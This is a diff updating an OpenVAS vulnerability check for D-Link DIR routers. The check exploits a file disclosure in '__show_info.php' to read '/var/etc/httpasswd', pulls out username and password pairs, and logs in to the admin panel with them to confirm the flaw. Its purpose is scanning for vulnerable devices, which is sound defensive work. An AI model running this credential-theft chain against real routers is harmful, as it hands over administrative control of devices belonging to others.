@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_dlink__show_info.php_64043.nasl 11865 2018-10-12 10:03:43Z cfischer $
+# $Id: gb_dlink__show_info.php_64043.nasl 12439 2018-11-20 13:01:33Z cfischer $
 #
 # Multiple D-Link DIR Series Routers 'model/__show_info.php' Local File Disclosure Vulnerability
 #
@@ -25,62 +25,65 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-if (description)
+if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.103858");
   script_bugtraq_id(64043);
-  script_version("$Revision: 11865 $");
+  script_version("$Revision: 12439 $");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-
-  script_name("Multiple D-Link DIR Series Routers 'model/__show_info.php' Local File Disclosure Vulnerability");
-
-
-  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/64043");
-  script_xref(name:"URL", value:"http://www.dlink.com/");
-
-  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-11-20 14:01:33 +0100 (Tue, 20 Nov 2018) $");
   script_tag(name:"creation_date", value:"2013-12-16 14:34:55 +0100 (Mon, 16 Dec 2013)");
+  script_name("Multiple D-Link DIR Series Routers 'model/__show_info.php' Local File Disclosure Vulnerability");
   script_category(ACT_ATTACK);
-  script_tag(name:"qod_type", value:"remote_vul");
   script_family("Web application abuses");
   script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
-  script_dependencies("gb_dlink_dir_detect.nasl");
+  script_dependencies("gb_dlink_dsl_detect.nasl", "gb_dlink_dap_detect.nasl", "gb_dlink_dir_detect.nasl", "gb_dlink_dwr_detect.nasl");
+  script_mandatory_keys("Host/is_dlink_device"); # nb: Experiences in the past have shown that various different devices could be affected
   script_require_ports("Services/www", 80, 8080);
-  script_mandatory_keys("host_is_dlink_dir");
 
   script_tag(name:"impact", value:"Exploiting this vulnerability would allow an attacker to obtain
-potentially sensitive information from local files on devices running
-the vulnerable application. This may aid in further attacks.");
+  potentially sensitive information from local files on devices running
+  the vulnerable application. This may aid in further attacks.");
+
   script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request which tries to read '/var/etc/httpasswd'");
+
   script_tag(name:"insight", value:"The remote D-Link device fails to adequately validate user supplied input
-to 'REQUIRE_FILE' in '__show_info.php'");
+  to 'REQUIRE_FILE' in '__show_info.php'");
+
   script_tag(name:"solution", value:"Ask the Vendor for an update.");
-  script_tag(name:"solution_type", value:"VendorFix");
+
   script_tag(name:"summary", value:"Multiple D-Link DIR series routers are prone to a local file-
-disclosure vulnerability.  fails to adequately validate user-
-supplied input.");
-  script_tag(name:"affected", value:"D-Link DIR-615
-D-Link DIR-300
-DIR-600");
+  disclosure vulnerability because the routers fails to adequately validate user- supplied input.");
+
+  script_tag(name:"affected", value:"DIR-615 / DIR-300 / DIR-600.
+
+  Other devices and models might be affected as well.");
+
+  script_tag(name:"solution_type", value:"VendorFix");
+  script_tag(name:"qod_type", value:"remote_vul");
 
   exit(0);
 }
 
-include("http_func.inc");
+CPE_PREFIX = "cpe:/o:d-link";
+
 include("host_details.inc");
+include("http_func.inc");
 
+if(!infos = get_app_port_from_cpe_prefix(cpe:CPE_PREFIX, service:"www", first_cpe_only:TRUE)) exit(0);
 
-port = get_kb_item("dlink_dir_port");
-if(!port)exit(0);
+port = infos["port"];
+CPE = infos["cpe"];
 
-if(!get_port_state(port))exit(0);
+if(!dir = get_app_location(cpe:CPE, port:port)) exit(0);
+if(dir == "/") dir = "";
 
-url = '/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd';
+url = dir + '/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd';
 req = http_get(item:url, port:port);
-buf = http_send_recv(port:port, data:req, bodyonly:FALSE);
+buf = http_send_recv(port:port, data:req);
 
-if(buf !~ "HTTP/1.. 200" || "<center>" >!< buf)exit(99);
+if(buf !~ "^HTTP/1\.[01] 200" || "<center>" >!< buf) exit(99);
 
 creds = eregmatch(pattern:'<center>.*([a-zA-Z0-9]+:[a-zA-Z0-9]+)[^a-zA-Z0-9]*</center>', string:buf);
 
@@ -100,52 +103,45 @@ foreach line (lines) {
         ul[p++] = chomp(user_pass[1]);
         continue;
       }
-
     }
-
   }
 }
 
-if(max_index(ul) < 1)exit(99);
+if(max_index(ul) < 1) exit(99);
 
-url = '/tools_admin.php';
-req = http_get(item:url, port:port);
-buf = http_send_recv(port:port, data:req, bodyonly:FALSE);
+url2 = dir + '/tools_admin.php';
+req = http_get(item:url2, port:port);
+buf = http_send_recv(port:port, data:req);
 
-if("LOGIN_USER" >!< buf)exit(0);
+if("LOGIN_USER" >!< buf) exit(0);
 
 foreach p (ul) {
 
   u = split(p, sep:":", keep:FALSE);
 
-  if(isnull(u[0]))continue;
+  if(isnull(u[0])) continue;
 
   user = u[0];
   pass = u[1];
 
-  url = '/login.php';
+  url2 = dir + '/login.php';
   login_data = 'ACTION_POST=LOGIN&LOGIN_USER=' + user  + '&LOGIN_PASSWD=' + pass;
-  req = http_post(item:url, port:port, data:login_data);
+  req = http_post(item:url2, port:port, data:login_data);
+  buf = http_send_recv(port:port, data:req);
+  if(buf !~ "^HTTP/1\.[01] 200") continue;
 
-  buf = http_send_recv(port:port, data:req, bodyonly:FALSE);
-  if(buf !~ "HTTP/1.. 200")continue;
-
-  url = '/tools_admin.php';
-  req = http_get(item:url, port:port);
-  buf = http_send_recv(port:port, data:req, bodyonly:FALSE);
+  url2 = dir + '/tools_admin.php';
+  req = http_get(item:url2, port:port);
+  buf = http_send_recv(port:port, data:req);
 
   if("OPERATOR PASSWORD" >< buf && "ADMIN PASSWORD" >< buf) {
-
-    url = "/logout.php";
-    req = http_get(item:url, port:port);
-    http_send_recv(port:port, data:req, bodyonly:FALSE); # clear ip based auth
-
-    security_message(port:port);
+    url2 = "/logout.php";
+    req = http_get(item:url2, port:port);
+    http_send_recv(port:port, data:req); # clear ip based auth
+    report = report_vuln_url(port:port, url:url);
+    security_message(port:port, data:report);
     exit(0);
   }
-
-
 }
 
 exit(99);
-
